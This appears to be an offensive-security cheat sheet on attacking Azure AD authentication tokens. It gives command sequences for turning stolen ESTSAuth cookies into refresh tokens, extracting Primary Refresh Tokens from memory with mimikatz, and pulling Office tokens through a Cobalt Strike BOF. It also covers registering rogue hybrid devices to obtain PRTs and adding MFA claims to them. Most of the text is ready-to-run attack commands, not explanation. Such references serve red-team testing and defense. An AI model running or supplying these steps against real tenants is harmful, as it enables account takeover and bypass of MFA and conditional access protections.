# Azure AD Tokens


## Access Token

Decode access tokens: [jwt.ms](https://jwt.ms/)

* Request an access token using a service principal password
    ```ps1
    curl --location --request POST 'https://login.microsoftonline.com/<tenant-name>/oauth2/v2.0/token' \
    --header 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode 'client_id=<client-id>' \
    --data-urlencode 'scope=https://graph.microsoft.com/.default' \
    --data-urlencode 'client_secret=<client-secret>' \
    --data-urlencode 'grant_type=client_credentials'
    ```
* Use an access token
    ```ps1
    # use the jwt
    $token = "eyJ0eXAiO..."
    $secure = $token | ConvertTo-SecureString -AsPlainText -Force
    Connect-MgGraph -AccessToken $secure

    # whoami
    Get-MgContext
    Disconnect-MgGraph
    ```


## Refresh Token

* Requesting a token using credentials
    ```ps1
    TODO
    ```
* 


### Get a Refresh Token from ESTSAuth Cookie

`ESTSAuthPersistent` is only useful when a CA policy actually grants a persistent session. Otherwise, you should use `ESTSAuth`.

```ps1
TokenTacticsV2> Get-AzureTokenFromESTSCookie -ESTSAuthCookie "0.AS8"
TokenTacticsV2> Get-AzureTokenFromESTSCookie -Client MSTeams -ESTSAuthCookie "0.AbcAp.."
```


### Get a Refresh Token from Office process

* [trustedsec/CS-Remote-OPs-BOF](https://github.com/trustedsec/CS-Remote-OPs-BOF)
```ps1
load bofloader
execute_bof /opt/CS-Remote-OPs-BOF/Remote/office_tokens/office_tokens.x64.o --format-string i  7324
```


## FOCI Refresh Token

FOCI allows applications registered with Azure AD to share tokens, minimizing the need for separate authentications when a user accesses multiple applications that are part of the same "family."

* [secureworks/family-of-client-ids-research/](https://github.com/secureworks/family-of-client-ids-research/blob/main/scope-map.txt) - Research into Undocumented Behavior of Azure AD Refresh Tokens

**Generate tokens**   

```ps1
roadtx gettokens --refresh-token <refresh-token> -c <foci-id> -r https://graph.microsoft.com 
roadtx gettokens --refresh-token <refresh-token> -c 04b07795-8ddb-461a-bbee-02f9e1bf7b46
```

```
scope               resource                                client                              
.default            04b07795-8ddb-461a-bbee-02f9e1bf7b46    04b07795-8ddb-461a-bbee-02f9e1bf7b46
                    1950a258-227b-4e31-a9cf-717495945fc2    1950a258-227b-4e31-a9cf-717495945fc2
                    https://graph.microsoft.com             00b41c95-dab0-4487-9791-b9d2c32c80f2
                                                            04b07795-8ddb-461a-bbee-02f9e1bf7b46
                    https://graph.windows.net               00b41c95-dab0-4487-9791-b9d2c32c80f2
                                                            04b07795-8ddb-461a-bbee-02f9e1bf7b46
                    https://outlook.office.com              00b41c95-dab0-4487-9791-b9d2c32c80f2
                                                            04b07795-8ddb-461a-bbee-02f9e1bf7b46
Files.Read.All      d3590ed6-52b3-4102-aeff-aad2292ab01c    d3590ed6-52b3-4102-aeff-aad2292ab01c
                    https://graph.microsoft.com             3590ed6-52b3-4102-aeff-aad2292ab01c
                    https://outlook.office.com              1fec8e78-bce4-4aaf-ab1b-5451cc387264
Mail.ReadWrite.All  https://graph.microsoft.com             00b41c95-dab0-4487-9791-b9d2c32c80f2
                    https://outlook.office.com              00b41c95-dab0-4487-9791-b9d2c32c80f2
                    https://outlook.office365.com           00b41c95-dab0-4487-9791-b9d2c32c80f2
```


## Primary Refresh Token

A Primary Refresh Token (PRT) is a key artifact in the authentication and identity management process in Microsoft's Azure AD (Azure Active Directory) environment. The PRT is primarily used for maintaining a seamless sign-in experience on devices. 

* Use PRT token
    ```ps1
    roadtx browserprtauth --prt <prt-token> --prt-sessionkey <session-key>
    roadtx browserprtauth --prt roadtx.prt -url http://www.office.com
    ```


### Extract PRT v1

```ps1
mimikatz # token::elevate
mimikatz # sekurlsa::cloudap
mimikatz # sekurlsa::dpapi
mimikatz # dpapi::cloudapkd /keyvalue:<key-value> /unprotect
roadtx browserprtauth --prt <prt> --prt-sessionkey <clear-key> --keep-open -url https://portal.azure.com
```


### Extract PRT on Device with TPM

* No method known to date.


### Request a PRT using the Refresh Flow

* Request a nonce from AAD: `roadrecon auth --prt-init -t <tenant-id>`
* Use [dirkjanm/ROADtoken](https://github.com/dirkjanm/ROADtoken) or [wotwot563/aad_prt_bof](https://github.com/wotwot563/aad_prt_bof) to initiate a new PRT request.
* `roadrecon auth --prt-cookie <prt-cookie> --tokens-stdout --debug` or  `roadtx gettoken --prt-cookie <x-ms-refreshtokencredential>`
* Then browse to [login.microsoftonline.com ](login.microsoftonline.com ) with a cookie `x-ms-RefreshTokenCredential:<output-from-roadrecon>`


### Request a PRT with Hybrid Device

Requirements:

* ADDS user credentials
* hybrid environment (ADDS and Azure AD)

Use the user account to create a computer and request a PRT

* Create a computer account in AD: `impacket-addcomputer <domain>/<username>:<password> -dc-ip <dc-ip>`
* Configure the computer certificate in AD with [dirkjanm/roadtools_hybrid](https://github.com/dirkjanm/roadtools_hybrid): `python setcert.py 10.10.10.10  -t '<machine-account$>' -u '<domain>\<machine-account$>' -p <machine-password>`
* Register the hybrid device in Azure AD with this certificate: `roadtx hybriddevice -c '<machine-account>.pem' -k '<machine-account>.key' --sid '<device-sid>' -t '<aad-tenant-id>'`
* Get a PRT with device claim

    ```ps1
    roadtx prt -c <hybrid-device-name>.pem -k <hybrid-device-name>.key -u <username>@h<domain> -p <password>
    roadtx browserprtauth --prt <prt-token> --prt-sessionkey <prt-session-key> --keep-open -url https://portal.azure.com
    ```


### Upgrade Refresh Token to PRT

* Get correct token audience: `roadtx gettokens -c 29d9ed98-a469-4536-ade2-f981bc1d605e -r urn:ms-drs:enterpriseregistration.windows.net --refresh-token file`
* Registering device: `roadtx device -a register -n <device-name>`
* Request PRT `roadtx prt --refresh-token <refresh-token> -c <device-name>.pem -k <device-name>.key`
* Use a PRT: `roadtx browserprtauth --prt <prt-token> --prt-sessionkey <prt-session-key> --keep-open -url https://portal.azure.com`


### Enriching a PRT with MFA claim

* Request a special refresh token: `roadtx prtenrich -u username@domain`
* Request a PRT with MFA claim: `roadtx prt -r <refreshtoken> -c <device>.pem -k <device>.key`




## Authenticate to the Microsoft Graph API in PowerShell

* [Microsoft Applications ID](https://learn.microsoft.com/fr-fr/troubleshoot/azure/active-directory/verify-first-party-apps-sign-in)

| Name                       | GUID                                 |
|----------------------------|--------------------------------------|
| Microsoft Azure PowerShell | 1950a258-227b-4e31-a9cf-717495945fc2 |	
| Microsoft Azure CLI	     | 04b07795-8ddb-461a-bbee-02f9e1bf7b46 |
| Portail Azure              | c44b4083-3bb0-49c1-b47d-974e53cbdf3c |	


### Graph API Refresh Token

Authenticating to the Microsoft Graph API in PowerShell

```ps1
$body = @{
    "client_id" =     "1950a258-227b-4e31-a9cf-717495945fc2"
    "resource" =      "https://graph.microsoft.com" # Microsoft Graph API 
}
$UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
$Headers=@{}
$Headers["User-Agent"] = $UserAgent
$authResponse = Invoke-RestMethod `
    -UseBasicParsing `
    -Method Post `
    -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
    -Headers $Headers `
    -Body $body
$authResponse
```


### Graph API Access Token

This request require getting the Refresh Token.

```ps1
$body=@{
    "client_id" =  "1950a258-227b-4e31-a9cf-717495945fc2"
    "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
    "code" =       $authResponse.device_code
}
$Tokens = Invoke-RestMethod `
    -UseBasicParsing `
    -Method Post `
    -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" `
    -Headers $Headers `
    -Body $body
$Tokens
```


## References

* [Hacking Your Cloud: Tokens Edition 2.0 - Edwin David - April 13, 2023](https://trustedsec.com/blog/hacking-your-cloud-tokens-edition-2-0)
* [Microsoft 365 Developer Program](https://developer.microsoft.com/en-us/microsoft-365/dev-program)
* [PRT Abuse from Userland with Cobalt Strike - 0xbad53c](https://red.0xbad53c.com/red-team-operations/azure-and-o365/prt-abuse-from-userland-with-cobalt-strike)